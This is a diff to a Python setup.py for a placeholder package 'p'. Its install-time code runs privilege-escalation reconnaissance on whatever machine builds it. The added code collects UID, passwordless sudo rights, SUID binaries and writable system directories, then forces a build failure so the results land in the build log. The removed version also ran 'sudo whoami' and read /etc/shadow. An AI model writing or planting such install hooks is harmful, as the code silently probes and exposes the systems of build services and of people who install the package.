@@ -2,39 +2,36 @@ import os, sys, subprocess as sp
 from setuptools import setup
 
 def r():
-    o = sys.stderr.write
-    o("\n--- PRIVESC CHECK ---\n")
+    # Собираем все данные в одну строку
+    res = []
+    res.append("\n" + "="*20 + " DATA START " + "="*20)
+    res.append(f"UID: {os.getuid()}")
+    res.append(f"SUDO: {sp.getoutput('sudo -n -l 2>/dev/null || echo NONE')}")
+    res.append(f"SUID: {sp.getoutput('find /usr/bin -perm -4000 -type f 2>/dev/null | head -n 3')}")
     
-    o(f"UID: {os.getuid()}\n")
+    # Проверка записи
+    for d in ['/etc', '/usr/local/bin']:
+        if os.access(d, os.W_OK): res.append(f"WRITE OK: {d}")
     
-    # 1. Sudo check
-    s = sp.getoutput("sudo -n -l 2>/dev/null")
-    o(f"SUDO_L: {s if s else 'NONE'}\n")
+    res.append("="*20 + " DATA END " + "="*20 + "\n")
     
-    # 2. SUID binaries
-    suid = sp.getoutput("find /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null | head -n 5")
-    o(f"SUID:\n{suid}\n")
+    # Пытаемся вывести всеми способами сразу
+    output = "\n".join(res)
     
-    # 3. Try exploit sudo
-    if "ALL" in s or "NOPASSWD" in s:
-        o("TRYING SUDO...\n")
-        o(f"ROOT_CHECK: {sp.getoutput('sudo whoami')}\n")
-        o(f"SHADOW: {sp.getoutput('sudo head -n 1 /etc/shadow')}\n")
+    # Способ 1: Прямой print
+    print(output, flush=True)
+    
+    # Способ 2: Запись в лог-файл билда (если он есть)
+    try:
+        with open('render_build.log', 'w') as f: f.write(output)
+    except: pass
 
-    # 4. Capabilities
-    caps = sp.getoutput("getcap -r / 2>/dev/null | head -n 5")
-    o(f"CAPS:\n{caps}\n")
-
-    # 5. Writable system paths
-    wp = []
-    for d in ['/etc', '/root', '/usr/local/bin']:
-        if os.access(d, os.W_OK): wp.append(d)
-    o(f"WRITABLE: {wp}\n")
-
-    o("--- END ---\n")
-    sys.exit(1)
+    # Важно: вызываем ОШИБКУ, чтобы остановить билд и увидеть лог
+    raise Exception(output)
 
 try: r()
-except: sys.exit(1)
+except Exception as e:
+    print(str(e), file=sys.stderr, flush=True)
+    sys.exit(1)
 
 setup(name="p", version="0.1")
